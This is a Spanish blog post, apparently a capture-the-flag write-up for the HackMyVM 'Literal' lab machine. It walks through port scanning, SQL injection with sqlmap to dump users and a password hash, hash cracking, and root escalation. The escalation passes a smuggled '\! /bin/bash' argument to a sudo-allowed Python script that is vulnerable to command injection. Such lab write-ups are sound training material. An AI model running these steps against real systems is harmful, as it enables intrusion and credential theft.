<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">HackMyVM - Literal | noname</title>
<meta property="og:title" content="HackMyVM - Literal | noname" />
<meta name="twitter:title" content="HackMyVM - Literal | noname" />
<meta itemprop="name" content="HackMyVM - Literal | noname" />
<meta name="application-name" content="HackMyVM - Literal | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="">
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />



  <meta itemprop="image" content="https://0x-noname.github.io/" />
  <meta property="og:image" content="https://0x-noname.github.io/" />
  <meta name="twitter:image" content="https://0x-noname.github.io/" />
  <meta name="twitter:image:src" content="https://0x-noname.github.io/" />




    
    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2023-04-23T19:20:23&#43;0200 />
    <meta property="article:published_time" content=2023-04-23T19:20:23&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "HackMyVM - Literal",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2023-04-23",
        "description": "",
        "wordCount":  1022 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-04-23",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>



<meta name="generator" content="Hugo 0.111.3">

    

    <link rel="canonical" href="https://0x-noname.github.io/writeups/hmv/literal/">
    <link href="/style.min.0dafdc75467b093a9691e40fa17265d2fe1f3baba37da4faf9af6a1b0b035248.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    </head>
<body data-theme = "" class="notransition">
<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://0x-noname.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title>Home</title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">HackMyVM - Literal</h1>
                
                <div class="post-meta">
                    <time datetime="2023-04-23T19:20:23&#43;02:00" itemprop="datePublished"> Apr 23, 2023 </time>
                </div>
            </header><div class="page-content">
                <p><img src="/../machines/hmv/literal/literal_logo.png" alt="logo"></p>
<ul>
<li><em>SQL injection</em></li>
<li><em>Hash Cracking</em></li>
<li><em>sudo abuse python script</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -p- -T5 -v -n 192.168.1.14
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp open  ssh
</span></span><span style="display:flex;"><span>80/tcp open  http
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -sVC -v -p 22,80 192.168.1.14
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   3072 30ca559468338b5042f4c2b5139966fe (RSA)
</span></span><span style="display:flex;"><span>|   256 2db05e6b96bd0be314fbe0d058845085 (ECDSA)
</span></span><span style="display:flex;"><span>|_  256 92d92a5d6f58db8556d60c9968b85964 (ED25519)
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://blog.literal.hmv
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span style="display:flex;"><span>Service Info: Host: blog.literal.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h3 id="http">HTTP</h3>
<p>Si intento ir a la web me redirige automáticamente al subdominio <code>blog.literal.hmv</code>.</p>
<p><img src="/../machines/hmv/literal/puerto80.png" alt="puerto80"></p>
<p>Añado el subdominio al archivo hosts de mi equipo y me conecto de nuevo a la web.</p>
<p><img src="/../machines/hmv/literal/blog.png" alt="blog"></p>
<p>Me voy a login, creo un usuario y me logueo.</p>
<p><img src="/../machines/hmv/literal/hi_noname.png" alt="hi_noname"></p>
<p>Hago click en <code>Check what projects I'm working on</code> y veo una lista.</p>
<p><img src="/../machines/hmv/literal/noname_next_projects.png" alt="noname_next_projects"></p>
<p>Después de interceptar la petición con burpsuite la guardo a un fichero con <code>copy to file</code> y le doy el nombre de burp.</p>
<p><img src="/../machines/hmv/literal/burpcaptura.png" alt="puerto80"></p>
<p>Ahora utilizo el fichero que he guardado anteriormente para usarlo con sqlmap y buscar el nombre de la base de datos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ sqlmap -r burp --level 5 --risk 3 --dbs
</span></span><span style="display:flex;"><span>[20:27:45] [INFO] fetching database names
</span></span><span style="display:flex;"><span>available databases [4]:
</span></span><span style="display:flex;"><span>[*] blog
</span></span><span style="display:flex;"><span>[*] information_schema
</span></span><span style="display:flex;"><span>[*] mysql
</span></span><span style="display:flex;"><span>[*] performance_schema
</span></span></code></pre></div><p>Buscando las tablas de blog.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ sqlmap -r burp --level 5 --risk 3 -D blog --tables
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[20:31:17] [INFO] fetching tables for database: &#39;blog&#39;
</span></span><span style="display:flex;"><span>Database: blog
</span></span><span style="display:flex;"><span>[2 tables]
</span></span><span style="display:flex;"><span>+----------+
</span></span><span style="display:flex;"><span>| projects |
</span></span><span style="display:flex;"><span>| users    |
</span></span><span style="display:flex;"><span>+----------+
</span></span></code></pre></div><p>Dumpeando users.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ sqlmap -r burp --level 5 --risk 3 -D blog -T users --dump
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dump_db_blog
</span></span></code></pre></div><p>Encuentro dos usuarios con un nuevo subdominio.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>| 8      | walter    | walter@forumtesting.literal.hmv
</span></span><span style="display:flex;"><span>| 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv
</span></span></code></pre></div><p>Añado el subdominio a mi archivo hosts y me conecto a el.</p>
<p><img src="/../machines/hmv/literal/forumtesting.png" alt="forumtesting"></p>
<p>Le doy click a categories y veo el parámetro <strong><em>category_id=2</em></strong>.</p>
<p><img src="/../machines/hmv/literal/forumtesting_category.png" alt="forumtesting_category"></p>
<p>Encuentro la base de datos <code>forumtesting</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>sqlmap -u &#34;http://forumtesting.literal.hmv/category.php?category_id=2&#34; 
</span></span><span style="display:flex;"><span>--level 5 --risk 3 --dbs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[21:01:30] [INFO] retrieved: forumtesting
</span></span><span style="display:flex;"><span>available databases [3]:
</span></span><span style="display:flex;"><span>[*] forumtesting
</span></span><span style="display:flex;"><span>[*] information_schema
</span></span><span style="display:flex;"><span>[*] performance_schema
</span></span></code></pre></div><p>Obtengo las tablas.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ sqlmap -u &#34;http://forumtesting.literal.hmv/category.php?category_id=2&#34; --level 5 --risk 3 -D forumtesting --tables
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[21:04:36] [INFO] retrieved: forum_users
</span></span><span style="display:flex;"><span>Database: forumtesting
</span></span><span style="display:flex;"><span>[5 tables]
</span></span><span style="display:flex;"><span>+----------------+
</span></span><span style="display:flex;"><span>| forum_category |
</span></span><span style="display:flex;"><span>| forum_owner    |
</span></span><span style="display:flex;"><span>| forum_posts    |
</span></span><span style="display:flex;"><span>| forum_topics   |
</span></span><span style="display:flex;"><span>| forum_users    |
</span></span><span style="display:flex;"><span>+----------------+
</span></span></code></pre></div><p>Dumpeo <code>forum_owner</code> y obtengo un hash para carlos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ sqlmap -u &#34;http://forumtesting.literal.hmv/category.php?category_id=2&#34; --level 5 --risk 3 -D forumtesting -T forum_owner --dump
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[21:07:43] [INFO] retrieved: 2022-02-12
</span></span><span style="display:flex;"><span>[21:07:43] [INFO] retrieved: carlos@forumtesting.literal.htb
</span></span><span style="display:flex;"><span>[21:07:44] [INFO] retrieved: 1
</span></span><span style="display:flex;"><span>[21:07:44] [INFO] retrieved: 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99
</span></span><span style="display:flex;"><span>[21:07:49] [INFO] retrieved: carlos
</span></span><span style="display:flex;"><span>[21:07:49] [INFO] recognized possible password hashes in column &#39;password&#39;
</span></span></code></pre></div><p>Para romper el hash usaré el mismo <code>sqlmap</code> ya que nos ofrece esa opción y es bastante intuitivo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
</span></span><span style="display:flex;"><span>[21:14:27] [INFO] writing hashes to a temporary file &#39;/tmp/sqlmaps0oti3_q65473/sqlmaphashes-9njg5mis.txt&#39; 
</span></span><span style="display:flex;"><span>do you want to crack them via a dictionary-based attack? [Y/n/q] y
</span></span><span style="display:flex;"><span>[21:14:28] [INFO] using hash method &#39;sha512_generic_passwd&#39;
</span></span><span style="display:flex;"><span>what dictionary do you want to use?
</span></span><span style="display:flex;"><span>[1] default dictionary file &#39;/usr/share/sqlmap/data/txt/wordlist.tx_&#39; (press Enter)
</span></span><span style="display:flex;"><span>[2] custom dictionary file
</span></span><span style="display:flex;"><span>[3] file with list of dictionary files
</span></span><span style="display:flex;"><span>&gt; 2
</span></span><span style="display:flex;"><span>what&#39;s the custom dictionary&#39;s location?
</span></span><span style="display:flex;"><span>&gt; /usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span>[21:14:46] [INFO] using custom dictionary
</span></span><span style="display:flex;"><span>do you want to use common password suffixes? (slow!) [y/N] n
</span></span><span style="display:flex;"><span>[21:14:51] [INFO] starting dictionary-based cracking (sha512_generic_passwd)
</span></span><span style="display:flex;"><span>[21:14:51] [INFO] starting 4 processes 
</span></span><span style="display:flex;"><span>[21:15:13] [INFO] cracked password &#39;forum******&#39; for user &#39;carlos&#39;
</span></span></code></pre></div><hr>
<blockquote>
<p>Este paso es un poco troll porque una vez obtienes la contraseña hay que deducir que formato tendría la contraseña para SSH. Digamos que se puede reutilizar pero cambiando algunos carácteres.</p>
</blockquote>
<p>Me conecto al sistema y verifico que permisos tengo con sudo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>carlos@literal:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries for carlos on literal:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>User carlos may run the following commands on literal:
</span></span><span style="display:flex;"><span>    (root) NOPASSWD: /opt/my_things/blog/update_project_status.py *
</span></span></code></pre></div><p>Archivo <code>update_project_status.py</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Learning python3 to update my project status</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">References:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* MySQL commands in Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Shell commands in Python: https://stackabuse.com/executing-shell-commands-with-python/
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* Valid if root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> date
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Functions ------------------------------------------------.</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute_query</span>(sql):
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;mysql -u &#34;</span> <span style="color:#f92672">+</span> db_user <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; -D &#34;</span> <span style="color:#f92672">+</span> db_name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; -e </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> sql <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Query all rows</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">query_all</span>():
</span></span><span style="display:flex;"><span>    sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM projects;&#34;</span>
</span></span><span style="display:flex;"><span>    execute_query(sql)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Query row by ID</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">query_by_id</span>(arg_project_id):
</span></span><span style="display:flex;"><span>    sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM projects WHERE proid = &#34;</span> <span style="color:#f92672">+</span> arg_project_id <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;;&#34;</span>
</span></span><span style="display:flex;"><span>    execute_query(sql)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Update database</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update_status</span>(enddate, arg_project_id, arg_project_status):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> enddate <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        sql <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;UPDATE projects SET prodateend = &#39;&#34;</span> <span style="color:#f92672">+</span> str(enddate) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;, prostatus = &#39;&#34;</span> <span style="color:#f92672">+</span> arg_project_status <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; WHERE proid = &#39;&#34;</span> <span style="color:#f92672">+</span> arg_project_id <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        sql <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;UPDATE projects SET prodateend = &#39;2222-12-12&#39;, prostatus = &#39;&#34;</span> <span style="color:#f92672">+</span> arg_project_status <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; WHERE proid = &#39;&#34;</span> <span style="color:#f92672">+</span> arg_project_id <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;;&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    execute_query(sql)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Main program</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Fast validation</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        arg_project_id <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        arg_project_id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        arg_project_status <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        arg_project_status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> arg_project_id <span style="color:#f92672">and</span> arg_project_status: <span style="color:#75715e"># To update</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Avoid update by error</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>geteuid() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            array_status <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;Done&#34;</span>, <span style="color:#e6db74">&#34;Doing&#34;</span>, <span style="color:#e6db74">&#34;To do&#34;</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> arg_project_status <span style="color:#f92672">in</span> array_status:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;[+] Before update project (&#34;</span> <span style="color:#f92672">+</span> arg_project_id <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>                query_by_id(arg_project_id)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> arg_project_status <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Done&#39;</span>:
</span></span><span style="display:flex;"><span>                    update_status(date<span style="color:#f92672">.</span>today(), arg_project_id, arg_project_status)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    update_status(<span style="color:#ae81ff">0</span>, arg_project_id, arg_project_status)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;Bro, avoid a fail: Done - Doing - To do&#34;</span>)
</span></span><span style="display:flex;"><span>                exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] New status of project (&#34;</span> <span style="color:#f92672">+</span> arg_project_id <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            query_by_id(arg_project_id)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Ejejeeey, avoid mistakes!&#34;</span>)
</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> arg_project_id:
</span></span><span style="display:flex;"><span>            query_by_id(arg_project_id)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        query_all()
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Variables ------------------------------------------------.</span>
</span></span><span style="display:flex;"><span>db_user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;carlos&#34;</span>
</span></span><span style="display:flex;"><span>db_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;blog&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Main program</span>
</span></span><span style="display:flex;"><span>main()
</span></span></code></pre></div><p>Obtengo el root de la siguiente forma.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>carlos@literal:~$ sudo /opt/my_things/blog/update_project_status.py &#39;\! /bin/bash&#39; &#39;To do&#39;
</span></span><span style="display:flex;"><span>[+] Before update project (\! /bin/bash)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>root@literal:/home/carlos# id;hostname
</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
</span></span></code></pre></div><hr>
<blockquote>
<p>Si se lanza el script con esos parámetros, el programa intentará actualizar el estado de un proyecto con el ID &ldquo;!/bin/bash&rdquo; y el estado &ldquo;To do&rdquo;. Además el programa también comprueba que el usuario que ejecuta el script tenga permisos de root. Si se ejecuta con &ldquo;sudo&rdquo;, esto se cumplirá.</p>
</blockquote>
<p>Y con esto resolvemos la máquina Literal.</p>

            </div>
        </article>
    </main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
